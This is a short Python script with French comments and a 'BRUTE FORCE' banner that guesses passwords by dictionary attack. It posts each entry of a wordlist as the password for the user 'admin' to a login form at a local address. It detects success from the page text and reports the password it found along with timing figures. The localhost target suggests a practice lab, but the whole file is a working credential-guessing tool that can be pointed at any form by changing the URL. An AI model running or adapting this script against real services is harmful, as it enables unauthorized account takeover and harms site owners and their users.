import requests
import time

# Cible (application locale)
URL = "http://127.0.0.1:5000/"
USERNAME = "admin"

# Charger la liste de mots de passe
with open("passwords.txt", "r") as file:
    passwords = file.read().splitlines()

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ 
       """)

attempts = 0
start_time = time.time()

session = requests.Session()

for password in passwords:
    attempts += 1

    data = {
        "username": USERNAME,
        "password": password
    }

    response = session.post(URL, data=data)

    print(f"[+] Tentative {attempts} : {password}")

    # Condition de succès (basée sur le message affiché)
    if "Connexion réussie" in response.text:
        print("\n[✔] Mot de passe trouvé !")
        print(f"[✔] Username : {USERNAME}")
        print(f"[✔] Password : {password}")
        break

end_time = time.time()

print("\n[*] Attaque terminée")
print(f"[*] Tentatives : {attempts}")
print(f"[*] Temps écoulé : {end_time - start_time:.2f} secondes")
